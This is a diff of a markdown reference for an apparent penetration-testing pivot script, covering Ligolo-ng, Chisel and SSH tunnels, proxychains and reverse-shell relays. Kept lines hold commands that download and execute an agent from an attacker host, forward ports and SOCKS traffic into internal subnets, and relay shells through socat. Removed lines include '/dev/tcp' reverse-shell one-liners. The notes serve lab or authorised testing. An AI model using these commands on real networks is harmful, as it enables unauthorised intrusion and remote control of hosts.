@@ -127,13 +127,11 @@ Creates TUN interface, adds route, starts proxy, optionally serves agent binarie
 **Step 1 — start the proxy (this terminal becomes the Ligolo console):**
 ```bash
 ./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
-# Script prints NEXT STEPS box, then proxy starts.
 # ligolo» prompt appears — this terminal is now the Ligolo console.
 ```
 
 **Step 2 — transfer the agent (second terminal or tmux pane):**
 ```bash
-# On the pivot host, download the agent from the Kali file server:
 # Linux:
 wget http://KALI_IP:80/agent -O /tmp/agent && chmod +x /tmp/agent
 # Windows:
@@ -189,11 +187,6 @@ Adds a second TUN + route for a second internal network reached through the firs
 listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
 listener_list    # verify it appears
 
-# On second pivot host — agent connects THROUGH first pivot:
-# <PIVOT1_INTERNAL_IP> = the internal-facing IP shown by `ifconfig` in Pivot1's Ligolo session
-# Linux:   /tmp/agent -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert
-# Windows: .\agent.exe -connect <PIVOT1_INTERNAL_IP>:11602 -ignore-cert
-
 # In Ligolo console, SESSION 2:
 tunnel_start --tun ligolo2
 ```
@@ -231,8 +224,6 @@ penelope -p 4444 -O
 ```bash
 # Upgrade shell first (on remote host):
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
-
 # Then enumerate the internal host from Kali:
 ./recon.sh --auto <INTERNAL_HOST_IP>   # note IP from shell, run recon
 ./escalatr.sh <INTERNAL_HOST_IP> --os linux # or --os windows, run from Kali
@@ -267,11 +258,8 @@ proxychains -q nmap -sT -Pn -p 80,443,445 172.16.1.10  # port check (must use -s
   --target-ip 172.16.1.10 --target-port 3389 \
   --local-port 13389
 
-# Effect: Kali:13389 → 10.10.10.5 → 172.16.1.10:3389
 # Run ON KALI:
 ssh -N -L 0.0.0.0:13389:172.16.1.10:3389 user@10.10.10.5 -p 22
-# Access: localhost:13389
-
 # Verification commands are printed after tunnel setup:
 curl -s http://localhost:13389        # HTTP services
 nc -zv localhost 13389                # TCP check (non-HTTP)
@@ -285,15 +273,10 @@ nc -zv localhost 13389                # TCP check (non-HTTP)
 
 # Run ON PIVOT:
 ssh -N -R 127.0.0.1:8080:127.0.0.1:8080 kali@KALI_IP
-# Requires: sudo systemctl start ssh (on Kali)
-
 # Verify tunnel works (run on Kali after pivot connects):
 nc -zv localhost 8080                    # TCP port check
 curl -s --connect-timeout 3 http://localhost:8080  # if HTTP
 
-# Debug if tunnel fails:
-# Confirm pivot SSH outbound to Kali: nc -zv KALI_IP 22 (from pivot)
-# Check Kali sshd GatewayPorts: grep GatewayPorts /etc/ssh/sshd_config
 # Check local port is bound: ss -tlnp | grep 8080
 ```
 
@@ -303,7 +286,6 @@ curl -s --connect-timeout 3 http://localhost:8080  # if HTTP
 
 # Run ON PIVOT:
 ssh -N -R 9999 kali@KALI_IP
-# proxychains.conf: socks5 127.0.0.1 9999
 # Requires: sudo systemctl start ssh (on Kali)
 ```
 
@@ -464,12 +446,9 @@ Re-establishes the most recently configured tunnel after a VPN drop, shell loss,
 # Ligolo-ng proxy + pre-built agent binaries
 sudo apt install ligolo-ng ligolo-ng-common-binaries
 
-# Chisel (if needed — not in Kali repos)
 # Download: https://github.com/jpillora/chisel/releases
 sudo cp chisel_linux_amd64 /usr/local/bin/chisel && sudo chmod +x /usr/local/bin/chisel
 
-# proxychains (pre-installed on Kali)
-# Config: /etc/proxychains4.conf
 # Add:    socks5 127.0.0.1 9999
 ```
 
@@ -496,9 +475,6 @@ xfreerdp /u:admin /p:pass /v:127.0.0.1:13389 /cert-ignore
 
 # Remote forward — expose your Kali listener on the pivot (reverse shell relay)
 ssh -R PIVOT_PORT:127.0.0.1:KALI_PORT user@PIVOT_IP -N -f
-# Target sends shell to PIVOT:PIVOT_PORT → forwarded to KALI:KALI_PORT
-# On target: bash -i >& /dev/tcp/PIVOT_IP/4445 0>&1
-
 # Dynamic forward (SOCKS proxy) — manual version of pivotr.sh ssh
 ssh -D 9050 user@PIVOT_IP -N -f
 # Edit /etc/proxychains4.conf: socks5 127.0.0.1 9050
@@ -517,16 +493,10 @@ chisel server --port 9001 --reverse
 
 # Pivot — connect as client (reverse SOCKS)
 ./chisel client KALI_IP:9001 R:9050:socks
-# Edit /etc/proxychains4.conf: socks5 127.0.0.1 9050
-
-# Specific port forward via Chisel (no SOCKS, just one port)
 # Kali server:
 chisel server --port 9001 --reverse
 # Pivot client:
 ./chisel client KALI_IP:9001 R:13389:INTERNAL_IP:3389
-# Then: xfreerdp /v:127.0.0.1:13389 /u:admin /p:pass /cert-ignore
-
-# Forward (pivot initiates toward internal — not reverse):
 # Pivot server:
 ./chisel server --port 9002
 # Kali client (when Kali can reach pivot but not internal):
@@ -540,24 +510,15 @@ chisel client PIVOT_IP:9002 9050:socks
 When you need to go: Kali → Pivot1 → Pivot2 → Target3:
 
 ```bash
-# Ligolo approach (recommended — cleanest)
-# After first Ligolo tunnel is up to Pivot1's network:
-
 # In Ligolo console: add a listener on Pivot1 for the second agent
 listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601
 
 # On Pivot2 (reached through Pivot1's network):
 ./agent -connect PIVOT1_IP:11602 -ignore-cert
 
-# Back in Ligolo: select Pivot2's session, add route for third network
 # In new terminal:
 sudo ip route add 172.16.2.0/24 dev ligolo
 
-# Chisel double pivot:
-# Kali: chisel server --port 9001 --reverse
-# Pivot1: ./chisel client KALI:9001 R:9002:socks     (exposes SOCKS on Kali:9002)
-#         ./chisel server --port 9003 --reverse        (listens for Pivot2)
-# Pivot2: ./chisel client PIVOT1:9003 R:9050:socks   (forward through Pivot1 to Kali)
 # Then: proxychains4 -q -f proxychains_socks9050.conf nmap ...
 ```
 
@@ -568,22 +529,10 @@ sudo ip route add 172.16.2.0/24 dev ligolo
 The script sets up listeners, but if they fail or you need a different approach:
 
 ```bash
-# Ligolo — add a listener on the Ligolo interface that forwards to your Penelope
 # In Ligolo console:
 listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
-# On Kali: penelope -p 4444 -O
-# On internal target: bash -i >& /dev/tcp/LIGOLO_INTERFACE_IP:4444 0>&1
-# (LIGOLO_INTERFACE_IP is the address shown on the ligolo interface, e.g., 240.0.0.1)
-
 # SSH reverse forward (simpler when Ligolo isn't running):
 ssh -R 4444:127.0.0.1:4444 user@PIVOT_IP -N -f
-# Internal target connects to: PIVOT_IP:4444 → forwarded to Kali:4444
-# On Kali: penelope -p 4444 -O
-
-# Chisel — reverse shell relay
-# On Kali: chisel server --port 9001 --reverse
-# On Pivot1: ./chisel client KALI:9001 R:4444:socks   # doesn't work directly for raw TCP
-# For raw TCP relay through chisel, use socat on the pivot:
 # On Pivot1: socat TCP-LISTEN:4444,fork TCP:KALI_IP:4444
 ```
 
@@ -606,19 +555,8 @@ ip route show | grep -E '10\.|172\.|192\.168'
 ping 10.10.10.5                   # if Ligolo, should work directly
 proxychains curl -sk http://10.10.10.5   # if Chisel/SSH SOCKS
 
-# 5. Common failure: agent process killed on target (AV, reboot, OOM)
-# → Re-transfer and restart the agent
-# → pivotr.sh reconnect handles this for Ligolo
-
-# 6. Common failure: Ligolo TUN interface deleted (Kali restart or ip link del)
-# → Recreate: sudo ip tuntap add user $USER mode tun ligolo
-# → sudo ip link set ligolo up
-# → sudo ip route add TARGET_SUBNET dev ligolo
-# → Restart proxy: ./proxy -selfcert -laddr 0.0.0.0:11601
-
 # 7. Check proxychains config is correct
 cat /etc/proxychains4.conf | tail -5
-# Should have: socks5 127.0.0.1 9050 (or your SOCKS port)
 # Run: proxychains curl http://10.10.10.5 -o /dev/null -v    # verbose test
 ```
 
@@ -648,8 +586,6 @@ curl http://127.0.0.1:8888/
 
 - [[_SCRIPTS/ligolo-ng]] — manual Ligolo-ng commands, console reference, troubleshooting
 - [[Tunneling_Pivoting]] — manual techniques and theory
-- [[OffSec_Pivoting_Field_Notes]] — engagement pivot reference
-- [[OffSec_Pivoting_Mental_Model]] — decision-tree bus review
 - [[penelope]] — shell handler used for reverse shells through tunnel
 - [[Active_Recon]] — scanning internal networks after pivot is established
 - [[recon]] — run against internal hosts once routing is up
